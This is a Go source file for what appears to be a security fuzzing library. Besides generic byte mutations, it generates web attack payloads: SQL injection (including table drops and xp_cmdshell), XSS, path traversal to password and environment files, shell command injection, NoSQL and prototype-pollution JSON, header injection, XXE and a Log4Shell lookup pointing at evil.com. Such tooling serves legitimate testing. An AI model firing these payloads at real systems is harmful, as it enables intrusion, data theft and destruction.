package fuzzer

import (
	"fmt"
	"math/rand"
	"strings"
	"unicode/utf8"
)

type Mutator struct{ rng *rand.Rand }

func NewMutator(seed int64) *Mutator { return &Mutator{rng: rand.New(rand.NewSource(seed))} }

type MutationStrategy int

const (
	MutateBitFlip MutationStrategy = iota
	MutateByteInc
	MutateByteDec
	MutateByteDel
	MutateByteIns
	MutateReplace
	MutateDuplicate
	MutateSwap
	MutateUnicode
	MutateOverflow
	MutateNullByte
	MutateNewline
)

func (m *Mutator) Mutate(s string, strategy MutationStrategy) string {
	switch strategy {
	case MutateBitFlip:
		return m.mutateBitFlip(s)
	case MutateByteInc:
		return m.mutateByteInc(s)
	case MutateByteDec:
		return m.mutateByteDec(s)
	case MutateByteDel:
		return m.mutateByteDel(s)
	case MutateByteIns:
		return m.mutateByteIns(s)
	case MutateReplace:
		return m.mutateReplace(s)
	case MutateDuplicate:
		return m.mutateDuplicate(s)
	case MutateSwap:
		return m.mutateSwap(s)
	case MutateUnicode:
		return m.mutateUnicode(s)
	case MutateOverflow:
		return m.mutateOverflow(s)
	case MutateNullByte:
		return m.mutateNullByte(s)
	case MutateNewline:
		return m.mutateNewline(s)
	}
	return s
}

func (m *Mutator) MutateAll(s string) []string {
	strats := []MutationStrategy{MutateBitFlip, MutateByteInc, MutateByteDec, MutateByteDel, MutateByteIns, MutateReplace, MutateDuplicate, MutateSwap, MutateUnicode, MutateOverflow, MutateNullByte, MutateNewline}
	seen := map[string]bool{s: true}
	var result []string
	for _, st := range strats {
		v := m.Mutate(s, st)
		if v != s && !seen[v] {
			seen[v] = true
			result = append(result, v)
		}
	}
	return result
}

func BoundaryValues(kind string) []string {
	switch kind {
	case "int", "integer", "number", "id":
		return []string{"-1", "0", "1", "2147483647", "-2147483648", "9223372036854775807", "-9223372036854775808", "9999999999", "NaN", "Infinity", "-Infinity", "null", "undefined"}
	case "string", "text", "name":
		return []string{"", "A", strings.Repeat("A", 256), strings.Repeat("A", 4096), "%s%s%s%s%s", "%n%n%n", "${jndi:ldap://evil.com/a}", "true", "false", "null", "undefined"}
	case "boolean", "bool":
		return []string{"true", "false", "1", "0", "yes", "no", "on", "off", "True", "False", "TRUE", "FALSE"}
	case "email":
		return []string{"a@b.com", "test@test.com", "admin@sxsc.com", "a@b.c", "x@x.x", "@", fmt.Sprintf("%s@%s.com", strings.Repeat("a", 255), strings.Repeat("b", 50))}
	case "url", "uri":
		return []string{"http://localhost", "https://localhost", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats", "ftp://evil.com", "javascript:alert(1)"}
	case "json":
		return []string{"{}", `{"__proto__":{"isAdmin":true}}`, `{"constructor":{"prototype":{"isAdmin":true}}}`, `{"$gt":""}`, `{"$ne":null}`, `{"$where":"1==1"}`}
	case "xml":
		return []string{`<?xml version="1.0"?><root/>`, `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`, `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]>`}
	}
	return BoundaryValues("string")
}

func (m *Mutator) mutateBitFlip(s string) string {
	if len(s) == 0 {
		return s
	}
	b := []byte(s)
	b[m.rng.Intn(len(b))] ^= 1 << uint(m.rng.Intn(8))
	return string(b)
}
func (m *Mutator) mutateByteInc(s string) string {
	if len(s) == 0 {
		return s
	}
	b := []byte(s)
	b[m.rng.Intn(len(b))]++
	return string(b)
}
func (m *Mutator) mutateByteDec(s string) string {
	if len(s) == 0 {
		return s
	}
	b := []byte(s)
	b[m.rng.Intn(len(b))]--
	return string(b)
}
func (m *Mutator) mutateByteDel(s string) string {
	if len(s) == 0 {
		return s
	}
	b := []byte(s)
	pos := m.rng.Intn(len(b))
	return string(append(b[:pos], b[pos+1:]...))
}
func (m *Mutator) mutateByteIns(s string) string {
	b := []byte(s)
	pos := m.rng.Intn(len(b) + 1)
	dest := make([]byte, len(b)+1)
	copy(dest, b[:pos])
	dest[pos] = byte(m.rng.Intn(256))
	copy(dest[pos+1:], b[pos:])
	return string(dest)
}
func (m *Mutator) mutateReplace(s string) string {
	vals := []string{"\x00", "%00", "\n", "\r\n", "../../../../etc/passwd", "' OR 1=1--", "<script>alert(1)</script>", "${7*7}", "`id`", "|id", ";id"}
	if len(s) == 0 {
		return vals[m.rng.Intn(len(vals))]
	}
	b := []byte(s)
	start := m.rng.Intn(len(b))
	end := start + m.rng.Intn(len(b)-start)
	if end > len(b) {
		end = len(b)
	}
	return string(b[:start]) + vals[m.rng.Intn(len(vals))] + string(b[end:])
}
func (m *Mutator) mutateDuplicate(s string) string {
	if len(s) < 2 {
		return s + s
	}
	b := []byte(s)
	sz := 1 + m.rng.Intn(len(b)/2+1)
	start := m.rng.Intn(len(b) - sz + 1)
	chunk := make([]byte, sz)
	copy(chunk, b[start:start+sz])
	pos := m.rng.Intn(len(b) + 1)
	return string(append(append(append(make([]byte, 0, len(b)+sz), b[:pos]...), chunk...), b[pos:]...))
}
func (m *Mutator) mutateSwap(s string) string {
	if len(s) < 2 {
		return s
	}
	b := []byte(s)
	pos := m.rng.Intn(len(b) - 1)
	b[pos], b[pos+1] = b[pos+1], b[pos]
	return string(b)
}
func (m *Mutator) mutateUnicode(s string) string {
	conf := map[rune]rune{'a': 'à', 'e': 'é', 'i': 'ï', 'o': 'ò', 'u': 'ù', 'c': 'ç', 'n': 'ñ', 's': 'š', 'A': 'À', 'E': 'É', 'O': 'Ò', '.': '․', '/': '⁄', '-': '‑', ';': ';', ':': 'ː', '<': '‹', '>': '›', '"': '“', '\'': '’'}
	if len(s) == 0 {
		return s
	}
	r := []rune(s)
	pos := m.rng.Intn(len(r))
	if rep, ok := conf[r[pos]]; ok {
		r[pos] = rep
	}
	return string(r)
}
func (m *Mutator) mutateOverflow(s string) string {
	over := []string{strings.Repeat("A", 256), strings.Repeat("A", 1024), strings.Repeat("A", 4096), strings.Repeat("A", 65536), "9" + strings.Repeat("9", 100)}
	return s + over[m.rng.Intn(len(over))]
}
func (m *Mutator) mutateNullByte(s string) string {
	if len(s) == 0 {
		return "\x00" + s
	}
	b := []byte(s)
	pos := m.rng.Intn(len(b))
	return string(append(append(b[:pos], 0), b[pos:]...))
}
func (m *Mutator) mutateNewline(s string) string {
	nls := []string{"\n", "\r", "\r\n", "%0d%0a", "%0a", "%0d"}
	nl := nls[m.rng.Intn(len(nls))]
	if len(s) == 0 {
		return nl + s
	}
	b := []byte(s)
	pos := m.rng.Intn(len(b))
	return string(append(append(b[:pos], []byte(nl)...), b[pos:]...))
}

func (m *Mutator) SQLiFuzz(params map[string]string) map[string][]string {
	result := make(map[string][]string)
	for param := range params {
		var p []string
		for _, comment := range []string{"--", "#", "/*", "*/"} {
			for _, op := range []string{"OR", "AND", "UNION SELECT"} {
				p = append(p, fmt.Sprintf("'%s 1=1 %s", op, comment), fmt.Sprintf("\") %s 1=1 %s", op, comment))
			}
		}
		sleepVal := m.rng.Intn(5) + 2
		p = append(p, fmt.Sprintf("' AND SLEEP(%d)--", sleepVal), fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepVal), fmt.Sprintf("'; WAITFOR DELAY '0:0:%d'--", sleepVal))
		p = append(p, "'; DROP TABLE users;--", "1; EXEC xp_cmdshell('whoami');--")
		for _, num := range []string{"-1", "0", "1", "9999999999"} {
			p = append(p, fmt.Sprintf("%s OR 1=1--", num), fmt.Sprintf("%s UNION SELECT NULL--", num))
		}
		result[param] = p
	}
	return result
}

func (m *Mutator) XSSFuzz() []string {
	tags := []string{"script", "img", "svg", "iframe", "body", "input", "details", "video", "audio", "marquee"}
	events := []string{"onerror", "onload", "onfocus", "ontoggle", "onstart", "onmouseover", "onclick"}
	protocols := []string{"javascript", "data", "vbscript"}
	var p []string
	for _, ev := range events {
		p = append(p, fmt.Sprintf("<svg/%s=alert(1)>", ev))
	}
	for _, proto := range protocols {
		p = append(p, fmt.Sprintf(`<a href="%s:alert(1)">click</a>`, proto), fmt.Sprintf(`%s&#x3A;alert(1)`, proto))
	}
	for i := 0; i < 15; i++ {
		tag := tags[m.rng.Intn(len(tags))]
		ev := events[m.rng.Intn(len(events))]
		p = append(p, fmt.Sprintf("<%s %s=alert(1)>", tag, ev), fmt.Sprintf("<%s/%s=alert(1)>", tag, ev))
	}
	return p
}

func (m *Mutator) PathTraversalFuzz() []string {
	files := []string{"/etc/passwd", "/etc/shadow", "/proc/self/environ", "/windows/win.ini"}
	encs := []string{"../", "..\\", "..%2F", "..%252F", "....//", "%2e%2e/"}
	var p []string
	for _, f := range files {
		for _, enc := range encs {
			for depth := 1; depth <= 5; depth++ {
				p = append(p, strings.Repeat(enc, depth)+f)
			}
		}
	}
	return append(p, "php://filter/convert.base64-encode/resource=index.php", "expect://id", "php://input")
}

func (m *Mutator) CMDIFuzz() []string {
	cmds := []string{"id", "whoami", "uname -a", "cat /etc/passwd", "ls -la /"}
	seps := []string{";", "|", "&&", "`", "$("}
	var p []string
	for _, cmd := range cmds {
		for _, sep := range seps {
			p = append(p, sep+cmd, sep+" "+cmd)
		}
		p = append(p, fmt.Sprintf("`%s`", cmd), fmt.Sprintf("$(%s)", cmd))
	}
	for _, sleep := range []int{4, 5} {
		p = append(p, fmt.Sprintf("; sleep %d", sleep), fmt.Sprintf("&& sleep %d", sleep))
	}
	return p
}

func (m *Mutator) JSONFuzz() []string {
	return []string{`{"id":{"$gt":""}}`, `{"id":{"$ne":null}}`, `{"$where":"1==1"}`, `{"$or":[{},{}]}`, `{"__proto__":{"isAdmin":true}}`, `{"constructor":{"prototype":{"isAdmin":true}}}`, `{"user":{"$gt":""},"password":{"$gt":""}}`, fmt.Sprintf(`{"id":"%s"}`, strings.Repeat("A", 10000)), `{"id":NaN}`, `{"id":Infinity}`}
}

func (m *Mutator) HeaderFuzz() map[string][]string {
	return map[string][]string{
		"X-Forwarded-Host": {"evil.com", "evil.com%0d%0aX-Injected:true"},
		"X-Forwarded-For":  {"127.0.0.1", "evil.com"},
		"X-Real-IP":        {"127.0.0.1", "10.0.0.1"},
		"X-Original-URL":   {"/admin", "/../../etc/passwd"},
	}
}

func DedupAndTrim(items []string, maxN int) []string {
	seen := make(map[string]bool, len(items))
	var result []string
	for _, item := range items {
		if !seen[item] && utf8.ValidString(item) {
			seen[item] = true
			result = append(result, item)
			if len(result) >= maxN {
				break
			}
		}
	}
	return result
}
